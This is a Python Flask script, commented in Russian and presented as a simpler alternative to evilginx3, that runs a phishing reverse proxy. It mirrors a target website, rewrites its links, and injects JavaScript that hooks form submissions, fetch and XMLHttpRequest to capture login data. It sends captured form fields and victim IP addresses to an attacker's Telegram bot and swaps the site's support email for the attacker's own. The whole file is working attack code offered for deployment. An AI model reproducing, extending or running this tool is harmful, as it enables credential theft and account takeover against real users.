#!/usr/bin/env python3
"""
Flask MITM Proxy - Зеркалирование любого сайта с перехватом данных
Альтернатива evilginx3 без сложной настройки
"""

from flask import Flask, request, Response, session
from bs4 import BeautifulSoup
import requests
import re
import json
import hashlib
import time
from urllib.parse import urljoin, urlparse, parse_qs
import logging

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-me'

# ============= КОНФИГУРАЦИЯ =============
TARGET_SITE = "https://example.com"  # Целевой сайт для зеркалирования
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "-100YOUR_CHAT_ID"
PROXY_DOMAIN = "your-domain.com"  # Твой домен

# Логирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= TELEGRAM =============
def send_to_telegram(data, session_id):
    """Отправка перехваченных данных в Telegram"""
    message = f"🎯 <b>ДАННЫЕ ПЕРЕХВАЧЕНЫ</b>\n\n"
    message += f"🆔 Session: <code>{session_id}</code>\n"
    message += f"🌐 IP: <code>{request.remote_addr}</code>\n"
    message += f"🕐 Время: {time.strftime('%d.m.%Y %H:%M:%S')}\n\n"
    message += f"<b>📋 ДАННЫЕ:</b>\n"
    
    for key, value in data.items():
        if isinstance(value, list):
            value = value[0] if value else ''
        message += f"• {key}: <code>{value}</code>\n"
    
    keyboard = {
        'inline_keyboard': [[
            {'text': '✅ Успех', 'callback_data': f'ok_{session_id}'},
            {'text': '❌ Ошибка', 'callback_data': f'err_{session_id}'}
        ]]
    }
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': keyboard
        }, timeout=5)
    except Exception as e:
        logger.error(f"Telegram error: {e}")


# ============= МОДИФИКАЦИЯ HTML =============
def inject_scripts(html, original_url):
    """Инъекция скриптов для перехвата данных"""
    soup = BeautifulSoup(html, 'html.parser')
    
    # Скрипт для перехвата форм
    intercept_script = """
    <script>
    (function() {
        // Перехват всех форм
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Отправка данных на наш сервер
            fetch('/api/intercept', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    url: form.action,
                    method: form.method,
                    data: data
                })
            });
        }, true);
        
        // Перехват AJAX запросов
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const [url, options] = args;
            
            if (options && options.method === 'POST') {
                fetch('/api/intercept', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        url: url,
                        method: 'POST',
                        data: options.body
                    })
                });
            }
            
            return originalFetch.apply(this, args);
        };
        
        // Перехват XMLHttpRequest
        const originalXHR = window.XMLHttpRequest.prototype.send;
        window.XMLHttpRequest.prototype.send = function(data) {
            if (this._method === 'POST' && data) {
                fetch('/api/intercept', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        url: this._url,
                        method: 'POST',
                        data: data
                    })
                });
            }
            return originalXHR.apply(this, arguments);
        };
    })();
    </script>
    """
    
    # Вставляем скрипт перед </body>
    if soup.body:
        script_tag = BeautifulSoup(intercept_script, 'html.parser')
        soup.body.append(script_tag)
    
    return str(soup)


def rewrite_urls(html, base_url):
    """Перезапись всех URL на наш прокси"""
    soup = BeautifulSoup(html, 'html.parser')
    
    # Перезапись ссылок
    for tag in soup.find_all(['a', 'link'], href=True):
        original_url = tag['href']
        if original_url.startswith('http'):
            tag['href'] = f"/proxy?url={original_url}"
        elif original_url.startswith('/'):
            tag['href'] = f"/proxy?url={urljoin(base_url, original_url)}"
    
    # Перезапись форм
    for form in soup.find_all('form', action=True):
        original_action = form['action']
        if original_action.startswith('http'):
            form['action'] = f"/proxy?url={original_action}"
        elif original_action.startswith('/'):
            form['action'] = f"/proxy?url={urljoin(base_url, original_action)}"
    
    # Перезапись скриптов и стилей
    for tag in soup.find_all(['script', 'img'], src=True):
        original_src = tag['src']
        if original_src.startswith('http'):
            tag['src'] = f"/proxy?url={original_src}"
        elif original_src.startswith('/'):
            tag['src'] = f"/proxy?url={urljoin(base_url, original_src)}"
    
    return str(soup)


# ============= LIVE РЕДАКТИРОВАНИЕ =============
REPLACEMENTS = {
    # Замена текста на странице
    'Login': 'Вход',
    'Password': 'Пароль',
    'Sign in': 'Войти',
    
    # Замена email/телефонов
    'support@example.com': 'your-email@gmail.com',
    
    # Инъекция дополнительных полей
    '<input type="password"': '<input type="password" data-capture="true"',
}

def apply_replacements(html):
    """Применение замен в HTML"""
    for old, new in REPLACEMENTS.items():
        html = html.replace(old, new)
    return html


# ============= РОУТЫ =============
@app.route('/')
def index():
    """Главная страница - зеркало целевого сайта"""
    return proxy_request(TARGET_SITE)


@app.route('/proxy')
def proxy():
    """Универсальный прокси для любых URL"""
    target_url = request.args.get('url', TARGET_SITE)
    return proxy_request(target_url)


@app.route('/<path:path>')
def catch_all(path):
    """Перехват всех остальных путей"""
    target_url = urljoin(TARGET_SITE, path)
    return proxy_request(target_url)


def proxy_request(target_url):
    """Основная функция проксирования"""
    # Создаем session ID для пользователя
    if 'session_id' not in session:
        session['session_id'] = hashlib.md5(
            f"{request.remote_addr}{time.time()}".encode()
        ).hexdigest()[:8]
    
    session_id = session['session_id']
    
    try:
        # Копируем заголовки
        headers = {key: value for key, value in request.headers if key.lower() not in ['host', 'connection']}
        
        # Выполняем запрос к целевому сайту
        if request.method == 'POST':
            resp = requests.post(
                target_url,
                data=request.form,
                headers=headers,
                cookies=request.cookies,
                allow_redirects=False,
                timeout=10
            )
            
            # Отправляем POST данные в Telegram
            if request.form:
                send_to_telegram(dict(request.form), session_id)
        else:
            resp = requests.get(
                target_url,
                headers=headers,
                cookies=request.cookies,
                allow_redirects=False,
                timeout=10
            )
        
        # Обработка ответа
        content_type = resp.headers.get('Content-Type', '')
        
        if 'text/html' in content_type:
            # HTML - модифицируем
            html = resp.text
            html = rewrite_urls(html, target_url)
            html = inject_scripts(html, target_url)
            html = apply_replacements(html)
            
            return Response(html, status=resp.status_code, headers=dict(resp.headers))
        else:
            # Остальное - проксируем как есть
            return Response(resp.content, status=resp.status_code, headers=dict(resp.headers))
    
    except Exception as e:
        logger.error(f"Proxy error: {e}")
        return f"Error: {e}", 500


@app.route('/api/intercept', methods=['POST'])
def intercept():
    """API для перехвата данных из JavaScript"""
    data = request.get_json()
    session_id = session.get('session_id', 'unknown')
    
    logger.info(f"Intercepted data from {session_id}: {data}")
    
    # Отправляем в Telegram
    if data.get('data'):
        send_to_telegram(data['data'], session_id)
    
    return {'success': True}


@app.route('/admin/sessions')
def admin_sessions():
    """Админка - список активных сессий"""
    # TODO: Реализовать отображение активных сессий
    return "Admin panel - coming soon"


# ============= ЗАПУСК =============
if __name__ == '__main__':
    print("=" * 50)
    print("🎯 MITM Proxy Server Started")
    print(f"Target: {TARGET_SITE}")
    print(f"Proxy: http://0.0.0.0:5000")
    print("=" * 50)
    
    # Для production используй gunicorn:
    # gunicorn -w 4 -b 0.0.0.0:5000 mitm_proxy:app
    
    app.run(host='0.0.0.0', port=5000, debug=True)
